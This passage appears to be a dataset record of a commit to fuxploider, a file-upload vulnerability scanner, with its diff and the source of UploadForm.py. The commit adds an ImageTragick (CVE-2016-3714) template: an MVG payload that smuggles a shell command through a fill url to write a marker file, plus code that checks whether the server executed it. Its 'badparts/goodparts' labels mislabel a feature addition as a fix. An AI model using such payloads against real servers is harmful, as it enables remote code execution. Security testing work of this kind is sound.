page.\n\nSince no malicious extension is needed for the exploitation of this\nvulnerability, support has been added for templates without \"nasty\"\nextensions. This vulnerability can be exploited by uploading a variety\nof image filetypes (png, jpg etc.), so all legitimate filetypes\nsupported by the file upload in the server will be tried.\n\nTested against a docker machine running a vulnerable instance of\nImageMagick. For testing, created a variant of a docker machine created\nby the chinese VulApps: http://vulapps.evalbug.com/i_imagemagick_1/\nThe docker variant used for testing can be found by running:\n- docker pull madhatter37/vulnerable_apps:imagemagick_1.0.2\n- docker run -d -p 80:80 madhatter37/vulnerable_apps:imagemagick_1.0.2\n- ./fuxploider.py --uploads-path uploads -u http://127.0.0.1/file_upload/poc.php --not-regex \"your file was not uploaded\" --true-regex \"has been uploaded to\" --data \"submit=Submit\" --template=imagetragick", "sha": "3ba30040d60a72fcf1a831635fa2ce43bc857073", "keyword": "remote code execution malicious", "diff": "diff --git a/UploadForm.py b/UploadForm.py\nindex 0de5e0c..8ad36d8 100644\n--- a/UploadForm.py\n+++ b/UploadForm.py\n@@ -85,12 +85,15 @@ def setup(self,initUrl) :\n \t\t\tpass#uploads folder provided\n \n \t#tries to upload a file through the file upload form\n-\tdef uploadFile(self,suffix,mime,payload) :\n+\tdef uploadFile(self,suffix,mime,payload,dynamicPayload=False) :\n \t\twith tempfile.NamedTemporaryFile(suffix=suffix) as fd :\n+\t\t\tfilename = os.path.basename(fd.name)\n+\t\t\tfilename_wo_ext = filename.split('.', 1)[0]\n+\t\t\tif dynamicPayload:\n+\t\t\t\tpayload = payload.replace(b\"$filename$\",bytearray(filename_wo_ext,'ascii'))\n \t\t\tfd.write(payload)\n \t\t\tfd.flush()\n \t\t\tfd.seek(0)\n-\t\t\tfilename = os.path.basename(fd.name)\n \t\t\tif self.shouldLog :\n \t\t\t\tself.logger.debug(\"Sending file %s with mime type : %s\",filename,mime)\n \t\t\tfu = self.session.post(self.uploadUrl,files={self.inputName:(filename,fd,mime)},data=self.postData)\n@@ -101,7 +104,7 @@ def uploadFile(self,suffix,mime,payload) :\n \t\t\t\tif self.logger.verbosity > 2 :\n \t\t\t\t\tprint(\"\\033[36m\"+fu.text+\"\\033[m\")\n \t\t\t\n-\t\treturn (fu,filename)\n+\t\treturn (fu,filename,filename_wo_ext)\n \n \t#detects if a given html code represents an upload success or not\n \tdef isASuccessfulUpload(self,html) :\n@@ -198,8 +201,8 @@ def detectCodeExec(self,url,regex) :\n \n \t#core function : generates a temporary file using a suffixed name, a mime type and content, uploads the temp file on the server and eventually try to detect\n \t#\tif code execution is gained through the uploaded file\n-\tdef submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None) :\n-\t\tfu = self.uploadFile(suffix,mime,payload)\n+\tdef submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None,codeExecURL=None,dynamicPayload=False) :\n+\t\tfu = self.uploadFile(suffix,mime,payload,dynamicPayload)\n \t\tuploadRes = self.isASuccessfulUpload(fu[0].text)\n \t\tresult = {\"uploaded\":False,\"codeExec\":False}\n \t\tif uploadRes :\n@@ -215,7 +218,11 @@ def submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None) :\n \t\t\t\turl = None\n \t\t\t\tsecondUrl = None\n \t\t\t\tif self.uploadsFolder :\n-\t\t\t\t\turl = self.schema+\"://\"+self.host+\"/\"+self.uploadsFolder+\"/\"+fu[1]\n+\t\t\t\t\tif codeExecURL:\n+\t\t\t\t\t\tfilename_wo_ext = fu[2]\n+\t\t\t\t\t\turl = codeExecURL.replace(\"$uploadFormDir$\",os.path.dirname(self.uploadUrl)).replace(\"$filename$\",filename_wo_ext)\n+\t\t\t\t\telse:\n+\t\t\t\t\t\turl = self.schema+\"://\"+self.host+\"/\"+self.uploadsFolder+\"/\"+fu[1]\n \t\t\t\t\tfilename = fu[1]\n \t\t\t\t\tsecondUrl = None\n \t\t\t\t\tfor b in getPoisoningBytes() :\ndiff --git a/fuxploider.py b/fuxploider.py\nindex 3324960..47634a9 100755\n--- a/fuxploider.py\n+++ b/fuxploider.py\n@@ -257,16 +257,24 @@\n \ttemplatefd = open(templatesFolder+\"/\"+template[\"filename\"],\"rb\")\n \ttemplatesData[template[\"templateName\"]] = templatefd.read()\n \ttemplatefd.close()\n-\tnastyExt = template[\"nastyExt\"]\n-\tnastyMime = getMime(extensions,nastyExt)\n-\tnastyExtVariants = template[\"extVariants\"]\n-\tfor t in techniques :\n-\t\tfor nastyVariant in [nastyExt]+nastyExtVariants :\n-\t\t\tfor legitExt in up.validExtensions :\n-\t\t\t\tlegitMime = getMime(extensions,legitExt)\n-\t\t\t\tmime = legitMime if t[\"mime\"] == \"legit\" else nastyMime\n-\t\t\t\tsuffix = t[\"suffix\"].replace(\"$legitExt$\",legitExt).replace(\"$nastyExt$\",nastyVariant)\n-\t\t\t\tattempts.append({\"suffix\":suffix,\"mime\":mime,\"templateName\":template[\"templateName\"]})\n+\tnastyExt = template.get(\"nastyExt\")\n+\tnastyMime = None if nastyExt == None else getMime(extensions,nastyExt)\n+\tnastyExtVariants = template.get(\"extVariants\")\n+\tcodeExecURL = template.get(\"codeExecURL\")\n+\tdynamicPayload = template.get(\"dynamicPayload\")\n+\tfor legitExt in up.validExtensions:\n+\t\tlegitMime = getMime(extensions, legitExt)\n+\t\tif nastyExt == None:\n+\t\t\tattempts.append({\"suffix\": \".\"+legitExt, \"mime\": legitMime, \"templateName\": template[\"templateName\"],\n+\t\t\t\t\t\t\t \"codeExecURL\": codeExecURL, \"dynamicPayload\": dynamicPayload})\n+\t\telse:\n+\t\t\tfor t in techniques :\n+\t\t\t\tfor nastyVariant in [nastyExt]+nastyExtVariants :\n+\t\t\t\t\tlegitMime = getMime(extensions,legitExt)\n+\t\t\t\t\tmime = legitMime if t[\"mime\"] == \"legit\" else nastyMime\n+\t\t\t\t\tsuffix = t[\"suffix\"].replace(\"$legitExt$\",legitExt).replace(\"$nastyExt$\",nastyVariant)\n+\t\t\t\t\tattempts.append({\"suffix\":suffix,\"mime\":mime,\"templateName\":template[\"templateName\"],\n+\t\t\t\t\t\t\t\t\t \"codeExecURL\":codeExecURL,\"dynamicPayload\":dynamicPayload})\n \n \n stopThreads = False\n@@ -281,8 +289,10 @@\n \t\t\tmime = a[\"mime\"]\n \t\t\tpayload = templatesData[a[\"templateName\"]]\n \t\t\tcodeExecRegex = [t[\"codeExecRegex\"] for t in templates if t[\"templateName\"] == a[\"templateName\"]][0]\n+\t\t\tcodeExecURL = a[\"codeExecURL\"]\n+\t\t\tdynamicPayload = a[\"dynamicPayload\"]\n \n-\t\t\tf = executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex)\n+\t\t\tf = executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex,codeExecURL,dynamicPayload)\n \t\t\tf.a = a\n \t\t\tfutures.append(f)\n \ndiff --git a/payloads/imagemagick_rce.mvg b/payloads/imagemagick_rce.mvg\nnew file mode 100644\nindex 0000000..7262940\n--- /dev/null\n+++ b/payloads/imagemagick_rce.mvg\n@@ -0,0 +1,4 @@\n+push graphic-context\n+viewbox 0 0 640 480\n+fill 'url(https://example.com/image.jpg\"|echo ImageTragick Detected! > \"$filename$.txt)'\n+pop graphic-context\ndiff --git a/templates.json b/templates.json\nindex 76b6870..07b0950 100644\n--- a/templates.json\n+++ b/templates.json\n@@ -28,5 +28,13 @@\n \t\t\"nastyExt\":\"jsp\",\n \t\t\"codeExecRegex\":\"12\",\n \t\t\"extVariants\":[\"JSP\",\"jSp\"]\n+\t},\n+\t{\n+\t\t\"templateName\" : \"imagetragick\",\n+\t\t\"description\" : \"Attempts to exploit RCE in ImageMagick (CVE-2016\u20133714)\",\n+\t\t\"filename\":\"imagemagick_rce.mvg\",\n+\t\t\"codeExecRegex\":\"ImageTragick Detected!\",\n+\t\t\"codeExecURL\":\"$uploadFormDir$/$filename$.txt\",\n+\t\t\"dynamicPayload\":\"True\"\n \t}\n ]\n", "files": {"/UploadForm.py": {"changes": [{"diff": "\n \t\t\tpass#uploads folder provided\n \n \t#tries to upload a file through the file upload form\n-\tdef uploadFile(self,suffix,mime,payload) :\n+\tdef uploadFile(self,suffix,mime,payload,dynamicPayload=False) :\n \t\twith tempfile.NamedTemporaryFile(suffix=suffix) as fd :\n+\t\t\tfilename = os.path.basename(fd.name)\n+\t\t\tfilename_wo_ext = filename.split('.', 1)[0]\n+\t\t\tif dynamicPayload:\n+\t\t\t\tpayload = payload.replace(b\"$filename$\",bytearray(filename_wo_ext,'ascii'))\n \t\t\tfd.write(payload)\n \t\t\tfd.flush()\n \t\t\tfd.seek(0)\n-\t\t\tfilename = os.path.basename(fd.name)\n \t\t\tif self.shouldLog :\n \t\t\t\tself.logger.debug(\"Sending file %s with mime type : %s\",filename,mime)\n \t\t\tfu = self.session.post(self.uploadUrl,files={self.inputName:(filename,fd,mime)},data=self.postData)\n", "add": 5, "remove": 2, "filename": "/UploadForm.py", "badparts": ["\tdef uploadFile(self,suffix,mime,payload) :", "\t\t\tfilename = os.path.basename(fd.name)"], "goodparts": ["\tdef uploadFile(self,suffix,mime,payload,dynamicPayload=False) :", "\t\t\tfilename = os.path.basename(fd.name)", "\t\t\tfilename_wo_ext = filename.split('.', 1)[0]", "\t\t\tif dynamicPayload:", "\t\t\t\tpayload = payload.replace(b\"$filename$\",bytearray(filename_wo_ext,'ascii'))"]}, {"diff": "\n \t\t\t\tif self.logger.verbosity > 2 :\n \t\t\t\t\tprint(\"\\033[36m\"+fu.text+\"\\033[m\")\n \t\t\t\n-\t\treturn (fu,filename)\n+\t\treturn (fu,filename,filename_wo_ext)\n \n \t#detects if a given html code represents an upload success or not\n \tdef isASuccessfulUpload(self,html) :\n", "add": 1, "remove": 1, "filename": "/UploadForm.py", "badparts": ["\t\treturn (fu,filename)"], "goodparts": ["\t\treturn (fu,filename,filename_wo_ext)"]}, {"diff": "\n \n \t#core function : generates a temporary file using a suffixed name, a mime type and content, uploads the temp file on the server and eventually try to detect\n \t#\tif code execution is gained through the uploaded file\n-\tdef submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None) :\n-\t\tfu = self.uploadFile(suffix,mime,payload)\n+\tdef submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None,codeExecURL=None,dynamicPayload=False) :\n+\t\tfu = self.uploadFile(suffix,mime,payload,dynamicPayload)\n \t\tuploadRes = self.isASuccessfulUpload(fu[0].text)\n \t\tresult = {\"uploaded\":False,\"codeExec\":False}\n \t\tif uploadRes :\n", "add": 2, "remove": 2, "filename": "/UploadForm.py", "badparts": ["\tdef submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None) :", "\t\tfu = self.uploadFile(suffix,mime,payload)"], "goodparts": ["\tdef submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None,codeExecURL=None,dynamicPayload=False) :", "\t\tfu = self.uploadFile(suffix,mime,payload,dynamicPayload)"]}, {"diff": "\n \t\t\t\turl = None\n \t\t\t\tsecondUrl = None\n \t\t\t\tif self.uploadsFolder :\n-\t\t\t\t\turl = self.schema+\"://\"+self.host+\"/\"+self.uploadsFolder+\"/\"+fu[1]\n+\t\t\t\t\tif codeExecURL:\n+\t\t\t\t\t\tfilename_wo_ext = fu[2]\n+\t\t\t\t\t\turl = codeExecURL.replace(\"$uploadFormDir$\",os.path.dirname(self.uploadUrl)).replace(\"$filename$\",filename_wo_ext)\n+\t\t\t\t\telse:\n+\t\t\t\t\t\turl = self.schema+\"://\"+self.host+\"/\"+self.uploadsFolder+\"/\"+fu[1]\n \t\t\t\t\tfilename = fu[1]\n \t\t\t\t\tsecondUrl = None\n \t\t\t\t\tfor b in getPoisoningBytes() :", "add": 5, "remove": 1, "filename": "/UploadForm.py", "badparts": ["\t\t\t\t\turl = self.schema+\"://\"+self.host+\"/\"+self.uploadsFolder+\"/\"+fu[1]"], "goodparts": ["\t\t\t\t\tif codeExecURL:", "\t\t\t\t\t\tfilename_wo_ext = fu[2]", "\t\t\t\t\t\turl = codeExecURL.replace(\"$uploadFormDir$\",os.path.dirname(self.uploadUrl)).replace(\"$filename$\",filename_wo_ext)", "\t\t\t\t\telse:", "\t\t\t\t\t\turl = self.schema+\"://\"+self.host+\"/\"+self.uploadsFolder+\"/\"+fu[1]"]}], "source": "\nimport logging,concurrent.futures from utils import * from urllib.parse import urljoin,urlparse from threading import Lock class UploadForm: \tdef __init__(self,notRegex,trueRegex,session,size,postData,uploadsFolder=None,formUrl=None,formAction=None,inputName=None): \t\tself.logger=logging.getLogger(\"fuxploider\") \t\tself.postData=postData \t\tself.formUrl=formUrl \t\turl=urlparse(self.formUrl) \t\tself.schema=url.scheme \t\tself.host=url.netloc \t\tself.uploadUrl=urljoin(formUrl, formAction) \t\tself.session=session \t\tself.trueRegex=trueRegex \t\tself.notRegex=notRegex \t\tself.inputName=inputName \t\tself.uploadsFolder=uploadsFolder \t\tself.size=size \t\tself.validExtensions=[] \t\tself.httpRequests=0 \t\tself.codeExecUrlPattern=None \t\tself.logLock=Lock() \t\tself.stopThreads=False \t\tself.shouldLog=True \t \tdef setup(self,initUrl): \t\tself.formUrl=initUrl \t\turl=urlparse(self.formUrl) \t\tself.schema=url.scheme \t\tself.host=url.netloc \t\tself.httpRequests=0 \t\ttry: \t\t\tinitGet=self.session.get(self.formUrl,headers={\"Accept-Encoding\":None}) \t\t\tself.httpRequests +=1 \t\t\tif self.logger.verbosity > 1: \t\t\t\tprintSimpleResponseObject(initGet) \t\t\tif self.logger.verbosity > 2: \t\t\t\tprint(\"\\033[36m\"+initGet.text+\"\\033[m\") \t\t\tif initGet.status_code < 200 or initGet.status_code > 300: \t\t\t\tself.logger.critical(\"Server responded with following status: %s -%s\",initGet.status_code,initGet.reason) \t\t\t\texit() \t\texcept Exception as e: \t\t\t\tself.logger.critical(\"%s: Host unreachable(%s)\",getHost(initUrl),e) \t\t\t\texit() \t\t \t\tdetectedForms=detectForms(initGet.text) \t\tif len(detectedForms)==0: \t\t\tself.logger.critical(\"No HTML form found here\") \t\t\texit() \t\tif len(detectedForms) > 1: \t\t\tself.logger.critical(\"%s forms found containing file upload inputs, no way to choose which one to test.\",len(detectedForms)) \t\t\texit() \t\tif len(detectedForms[0][1]) > 1: \t\t\tself.logger.critical(\"%s file inputs found inside the same form, no way to choose which one to test.\",len(detectedForms[0])) \t\t\texit() \t\tself.inputName=detectedForms[0][1][0][\"name\"] \t\tself.logger.debug(\"Found the following file upload input: %s\",self.inputName) \t\tformDestination=detectedForms[0][0] \t\ttry: \t\t\tself.action=formDestination[\"action\"] \t\texcept: \t\t\tself.action=\"\" \t\tself.uploadUrl=urljoin(self.formUrl,self.action) \t\tself.logger.debug(\"Using following URL for file upload: %s\",self.uploadUrl) \t\tif not self.uploadsFolder and not self.trueRegex: \t\t\tself.logger.warning(\"No uploads folder nor true regex defined, code execution detection will not be possible.\") \t\telif not self.uploadsFolder and self.trueRegex: \t\t\tprint(\"No uploads path provided, code detection can still be done using true regex capturing group.\") \t\t\tcont=input(\"Do you want to use the True Regex for code execution detection ?[Y/n] \") \t\t\tif cont.lower().startswith(\"y\") or cont==\"\": \t\t\t\tpreffixPattern=input(\"Preffix capturing group of the true regex with: \") \t\t\t\tsuffixPattern=input(\"Suffix capturing group of the true regex with: \") \t\t\t\tself.codeExecUrlPattern=preffixPattern+\"$captGroup$\"+suffixPattern \t\t\telse: \t\t\t\tself.logger.warning(\"Code execution detection will not be possible as there is no path nor regex pattern configured.\") \t\telse: \t\t\tpass \t \tdef uploadFile(self,suffix,mime,payload): \t\twith tempfile.NamedTemporaryFile(suffix=suffix) as fd: \t\t\tfd.write(payload) \t\t\tfd.flush() \t\t\tfd.seek(0) \t\t\tfilename=os.path.basename(fd.name) \t\t\tif self.shouldLog: \t\t\t\tself.logger.debug(\"Sending file %s with mime type: %s\",filename,mime) \t\t\tfu=self.session.post(self.uploadUrl,files={self.inputName:(filename,fd,mime)},data=self.postData) \t\t\tself.httpRequests +=1 \t\t\tif self.shouldLog: \t\t\t\tif self.logger.verbosity > 1: \t\t\t\t\tprintSimpleResponseObject(fu) \t\t\t\tif self.logger.verbosity > 2: \t\t\t\t\tprint(\"\\033[36m\"+fu.text+\"\\033[m\") \t\t\t \t\treturn(fu,filename) \t \tdef isASuccessfulUpload(self,html): \t\tresult=False \t\tvalidExt=False \t\tif self.notRegex: \t\t\tfileUploaded=re.search(self.notRegex,html) \t\t\tif fileUploaded==None: \t\t\t\tresult=True \t\t\t\tif self.trueRegex: \t\t\t\t\tmoreInfo=re.search(self.trueRegex,html) \t\t\t\t\tif moreInfo: \t\t\t\t\t\tresult=str(moreInfo.groups()) \t\tif self.trueRegex and not result: \t\t\tfileUploaded=re.search(self.trueRegex,html) \t\t\tif fileUploaded: \t\t\t\ttry: \t\t\t\t\tresult=str(fileUploaded.group(1)) \t\t\t\texcept: \t\t\t\t\tresult=str(fileUploaded.group(0)) \t\treturn result \t \tdef detectValidExtension(self, future): \t\tif not self.stopThreads: \t\t\thtml=future.result()[0].text \t\t\text=future.ext[0] \t\t\tr=self.isASuccessfulUpload(html) \t\t\tif r: \t\t\t\tself.validExtensions.append(ext) \t\t\t\tif self.shouldLog: \t\t\t\t\tself.logger.info(\"\\033[1m\\033[42mExtension %s seems valid for this form.\\033[m\", ext) \t\t\t\t\tif r !=True: \t\t\t\t\t\tself.logger.info(\"\\033[1;32mTrue regex matched the following information: %s\\033[m\",r) \t\t\treturn r \t\telse: \t\t\treturn None \t \tdef detectValidExtensions(self,extensions,maxN,extList=None): \t\tself.logger.info(\" \t\tn=0 \t\tif extList: \t\t\ttmpExtList=[] \t\t\tfor e in extList: \t\t\t\ttmpExtList.append((e,getMime(extensions,e))) \t\telse: \t\t\ttmpExtList=extensions \t\tvalidExtensions=[] \t\textensionsToTest=tmpExtList[0:maxN] \t\twith concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor: \t\t\tfutures=[] \t\t\ttry: \t\t\t\tfor ext in extensionsToTest: \t\t\t\t\tf=executor.submit(self.uploadFile,\".\"+ext[0],ext[1],os.urandom(self.size)) \t\t\t\t\tf.ext=ext \t\t\t\t\tf.add_done_callback(self.detectValidExtension) \t\t\t\t\tfutures.append(f) \t\t\t\tfor future in concurrent.futures.as_completed(futures): \t\t\t\t\ta=future.result() \t\t\t\t\tn +=1 \t\t\texcept KeyboardInterrupt: \t\t\t\tself.shouldLog=False \t\t\t\texecutor.shutdown(wait=False) \t\t\t\tself.stopThreads=True \t\t\t\texecutor._threads.clear() \t\t\t\tconcurrent.futures.thread._threads_queues.clear() \t\treturn n \t \tdef detectCodeExec(self,url,regex): \t\tif self.shouldLog: \t\t\tif self.logger.verbosity > 0: \t\t\t\tself.logger.debug(\"Requesting %s...\",url) \t\t \t\tr=self.session.get(url) \t\tif self.shouldLog: \t\t\tif r.status_code >=400: \t\t\t\tself.logger.warning(\"Code exec detection returned an http code of %s.\",r.status_code) \t\t\tself.httpRequests +=1 \t\t\tif self.logger.verbosity > 1: \t\t\t\tprintSimpleResponseObject(r) \t\t\tif self.logger.verbosity > 2: \t\t\t\tprint(\"\\033[36m\"+r.text+\"\\033[m\") \t\tres=re.search(regex,r.text) \t\tif res: \t\t\treturn True \t\telse: \t\t\treturn False \t \t \tdef submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None): \t\tfu=self.uploadFile(suffix,mime,payload) \t\tuploadRes=self.isASuccessfulUpload(fu[0].text) \t\tresult={\"uploaded\":False,\"codeExec\":False} \t\tif uploadRes: \t\t\tresult[\"uploaded\"]=True \t\t\tif self.shouldLog: \t\t\t\tself.logger.info(\"\\033[1;32mUpload of '%s' with mime type %s successful\\033[m\",fu[1], mime) \t\t\t \t\t\tif uploadRes !=True: \t\t\t\tif self.shouldLog: \t\t\t\t\tself.logger.info(\"\\033[1;32m\\tTrue regex matched the following information: %s\\033[m\",uploadRes) \t\t\tif codeExecRegex and valid_regex(codeExecRegex) and(self.uploadsFolder or self.trueRegex): \t\t\t\turl=None \t\t\t\tsecondUrl=None \t\t\t\tif self.uploadsFolder: \t\t\t\t\turl=self.schema+\"://\"+self.host+\"/\"+self.uploadsFolder+\"/\"+fu[1] \t\t\t\t\tfilename=fu[1] \t\t\t\t\tsecondUrl=None \t\t\t\t\tfor b in getPoisoningBytes(): \t\t\t\t\t\tif b in filename: \t\t\t\t\t\t\tsecondUrl=b.join(url.split(b)[:-1]) \t\t\t\telif self.codeExecUrlPattern: \t\t\t\t\t \t\t\t\t\turl=self.codeExecUrlPattern.replace(\"$captGroup$\",uploadRes) \t\t\t\telse: \t\t\t\t\tpass \t\t\t\t\t \t\t\t\tif url: \t\t\t\t\texecutedCode=self.detectCodeExec(url,codeExecRegex) \t\t\t\t\tif executedCode: \t\t\t\t\t\tresult[\"codeExec\"]=True \t\t\t\tif secondUrl: \t\t\t\t\texecutedCode=self.detectCodeExec(secondUrl,codeExecRegex) \t\t\t\t\tif executedCode: \t\t\t\t\t\tresult[\"codeExec\"]=True \t\treturn result \t \tdef detectForms(html): \t\tsoup=BeautifulSoup(html,'html.parser') \t\tdetectedForms=soup.find_all(\"form\") \t\treturnForms=[] \t\tif len(detectedForms) > 0: \t\t\tfor f in detectedForms: \t\t\t\tfileInputs=f.findChildren(\"input\",{\"type\":\"file\"}) \t\t\t\tif len(fileInputs) > 0: \t\t\t\t\treturnForms.append((f,fileInputs)) \t\treturn returnForms ", "sourceWithComments": "import logging,concurrent.futures\nfrom utils import *\nfrom urllib.parse import urljoin,urlparse\nfrom threading import Lock\n\nclass UploadForm :\n\tdef __init__(self,notRegex,trueRegex,session,size,postData,uploadsFolder=None,formUrl=None,formAction=None,inputName=None) :\n\t\tself.logger = logging.getLogger(\"fuxploider\")\n\t\tself.postData = postData\n\t\tself.formUrl = formUrl\n\t\turl = urlparse(self.formUrl)\n\t\tself.schema = url.scheme\n\t\tself.host = url.netloc\n\t\tself.uploadUrl = urljoin(formUrl, formAction)\n\t\tself.session = session\n\t\tself.trueRegex = trueRegex\n\t\tself.notRegex = notRegex\n\t\tself.inputName = inputName\n\t\tself.uploadsFolder = uploadsFolder\n\t\tself.size = size\n\t\tself.validExtensions = []\n\t\tself.httpRequests = 0\n\t\tself.codeExecUrlPattern = None #pattern for code exec detection using true regex findings\n\t\tself.logLock = Lock()\n\t\tself.stopThreads = False\n\t\tself.shouldLog = True\n\n\t#searches for a valid html form containing an input file, sets object parameters correctly\n\tdef setup(self,initUrl) :\n\t\tself.formUrl = initUrl\n\t\turl = urlparse(self.formUrl)\n\t\tself.schema = url.scheme\n\t\tself.host = url.netloc\n\n\t\tself.httpRequests = 0\n\t\ttry :\n\t\t\tinitGet = self.session.get(self.formUrl,headers={\"Accept-Encoding\":None})\n\t\t\tself.httpRequests += 1\n\t\t\tif self.logger.verbosity > 1 :\n\t\t\t\tprintSimpleResponseObject(initGet)\n\t\t\tif self.logger.verbosity > 2 :\n\t\t\t\tprint(\"\\033[36m\"+initGet.text+\"\\033[m\")\n\t\t\tif initGet.status_code < 200 or initGet.status_code > 300 :\n\t\t\t\tself.logger.critical(\"Server responded with following status : %s - %s\",initGet.status_code,initGet.reason)\n\t\t\t\texit()\n\t\texcept Exception as e :\n\t\t\t\tself.logger.critical(\"%s : Host unreachable (%s)\",getHost(initUrl),e)\n\t\t\t\texit()\n\t\t#r\u00e9cup\u00e9rer le formulaire,le d\u00e9tecter\n\t\tdetectedForms = detectForms(initGet.text)\n\t\tif len(detectedForms) == 0 :\n\t\t\tself.logger.critical(\"No HTML form found here\")\n\t\t\texit()\n\t\tif len(detectedForms) > 1 :\n\t\t\tself.logger.critical(\"%s forms found containing file upload inputs, no way to choose which one to test.\",len(detectedForms))\n\t\t\texit()\n\t\tif len(detectedForms[0][1]) > 1 :\n\t\t\tself.logger.critical(\"%s file inputs found inside the same form, no way to choose which one to test.\",len(detectedForms[0]))\n\t\t\texit()\n\n\t\tself.inputName = detectedForms[0][1][0][\"name\"]\n\t\tself.logger.debug(\"Found the following file upload input : %s\",self.inputName)\n\t\tformDestination = detectedForms[0][0]\n\n\t\ttry :\n\t\t\tself.action = formDestination[\"action\"]\n\t\texcept :\n\t\t\tself.action = \"\"\n\t\tself.uploadUrl = urljoin(self.formUrl,self.action)\n\n\t\tself.logger.debug(\"Using following URL for file upload : %s\",self.uploadUrl)\n\n\t\tif not self.uploadsFolder and not self.trueRegex :\n\t\t\tself.logger.warning(\"No uploads folder nor true regex defined, code execution detection will not be possible.\")\n\t\telif not self.uploadsFolder and self.trueRegex :\n\t\t\tprint(\"No uploads path provided, code detection can still be done using true regex capturing group.\")\n\t\t\tcont = input(\"Do you want to use the True Regex for code execution detection ? [Y/n] \")\n\t\t\tif cont.lower().startswith(\"y\") or cont == \"\" :\n\t\t\t\tpreffixPattern = input(\"Preffix capturing group of the true regex with : \")\n\t\t\t\tsuffixPattern = input(\"Suffix capturing group of the true regex with : \")\n\t\t\t\tself.codeExecUrlPattern = preffixPattern+\"$captGroup$\"+suffixPattern\n\t\t\telse :\n\t\t\t\tself.logger.warning(\"Code execution detection will not be possible as there is no path nor regex pattern configured.\")\n\t\telse :\n\t\t\tpass#uploads folder provided\n\n\t#tries to upload a file through the file upload form\n\tdef uploadFile(self,suffix,mime,payload) :\n\t\twith tempfile.NamedTemporaryFile(suffix=suffix) as fd :\n\t\t\tfd.write(payload)\n\t\t\tfd.flush()\n\t\t\tfd.seek(0)\n\t\t\tfilename = os.path.basename(fd.name)\n\t\t\tif self.shouldLog :\n\t\t\t\tself.logger.debug(\"Sending file %s with mime type : %s\",filename,mime)\n\t\t\tfu = self.session.post(self.uploadUrl,files={self.inputName:(filename,fd,mime)},data=self.postData)\n\t\t\tself.httpRequests += 1\n\t\t\tif self.shouldLog :\n\t\t\t\tif self.logger.verbosity > 1 :\n\t\t\t\t\tprintSimpleResponseObject(fu)\n\t\t\t\tif self.logger.verbosity > 2 :\n\t\t\t\t\tprint(\"\\033[36m\"+fu.text+\"\\033[m\")\n\t\t\t\n\t\treturn (fu,filename)\n\n\t#detects if a given html code represents an upload success or not\n\tdef isASuccessfulUpload(self,html) :\n\t\tresult = False\n\t\tvalidExt = False\n\t\tif self.notRegex :\n\t\t\tfileUploaded = re.search(self.notRegex,html)\n\t\t\tif fileUploaded == None :\n\t\t\t\tresult = True\n\t\t\t\tif self.trueRegex :\n\t\t\t\t\tmoreInfo = re.search(self.trueRegex,html)\n\t\t\t\t\tif moreInfo :\n\t\t\t\t\t\tresult = str(moreInfo.groups())\n\t\tif self.trueRegex and not result :\n\t\t\tfileUploaded = re.search(self.trueRegex,html)\n\t\t\tif fileUploaded :\n\t\t\t\ttry :\n\t\t\t\t\tresult = str(fileUploaded.group(1))\n\t\t\t\texcept :\n\t\t\t\t\tresult = str(fileUploaded.group(0))\n\t\treturn result\n\n\t#callback function for matching html text against regex in order to detect successful uploads\n\tdef detectValidExtension(self, future) :\n\t\tif not self.stopThreads :\n\t\t\thtml = future.result()[0].text\n\t\t\text = future.ext[0]\n\n\t\t\tr = self.isASuccessfulUpload(html)\n\t\t\tif r :\n\t\t\t\tself.validExtensions.append(ext)\n\t\t\t\tif self.shouldLog :\n\t\t\t\t\tself.logger.info(\"\\033[1m\\033[42mExtension %s seems valid for this form.\\033[m\", ext)\n\t\t\t\t\tif r != True :\n\t\t\t\t\t\tself.logger.info(\"\\033[1;32mTrue regex matched the following information : %s\\033[m\",r)\n\n\t\t\treturn r\n\t\telse :\n\t\t\treturn None\n\n\t#detects valid extensions for this upload form (sending legit files with legit mime types)\n\tdef detectValidExtensions(self,extensions,maxN,extList=None) :\n\t\tself.logger.info(\"### Starting detection of valid extensions ...\")\n\t\tn = 0\n\t\tif extList :\n\t\t\ttmpExtList = []\n\t\t\tfor e in extList :\n\t\t\t\ttmpExtList.append((e,getMime(extensions,e)))\n\t\telse :\n\t\t\ttmpExtList = extensions\n\t\tvalidExtensions = []\n\n\t\textensionsToTest = tmpExtList[0:maxN]\n\t\twith concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor :\n\t\t\tfutures = []\n\t\t\ttry :\n\t\t\t\tfor ext in extensionsToTest:\n\t\t\t\t\tf = executor.submit(self.uploadFile,\".\"+ext[0],ext[1],os.urandom(self.size))\n\t\t\t\t\tf.ext = ext\n\t\t\t\t\tf.add_done_callback(self.detectValidExtension)\n\t\t\t\t\tfutures.append(f)\n\t\t\t\tfor future in concurrent.futures.as_completed(futures) :\n\t\t\t\t\ta = future.result()\n\t\t\t\t\tn += 1\n\t\t\texcept KeyboardInterrupt :\n\t\t\t\tself.shouldLog = False\n\t\t\t\texecutor.shutdown(wait=False)\n\t\t\t\tself.stopThreads = True\n\t\t\t\texecutor._threads.clear()\n\t\t\t\tconcurrent.futures.thread._threads_queues.clear()\n\t\treturn n\n\n\t#detects if code execution is gained, given an url to request and a regex supposed to match the executed code output\n\tdef detectCodeExec(self,url,regex) :\n\t\tif self.shouldLog :\n\t\t\tif self.logger.verbosity > 0 :\n\t\t\t\tself.logger.debug(\"Requesting %s ...\",url)\n\t\t\n\t\tr = self.session.get(url)\n\t\tif self.shouldLog :\n\t\t\tif r.status_code >= 400 :\n\t\t\t\tself.logger.warning(\"Code exec detection returned an http code of %s.\",r.status_code)\n\t\t\tself.httpRequests += 1\n\t\t\tif self.logger.verbosity > 1 :\n\t\t\t\tprintSimpleResponseObject(r)\n\t\t\tif self.logger.verbosity > 2 :\n\t\t\t\tprint(\"\\033[36m\"+r.text+\"\\033[m\")\n\n\t\tres = re.search(regex,r.text)\n\t\tif res :\n\t\t\treturn True\n\t\telse :\n\t\t\treturn False\n\n\t#core function : generates a temporary file using a suffixed name, a mime type and content, uploads the temp file on the server and eventually try to detect\n\t#\tif code execution is gained through the uploaded file\n\tdef 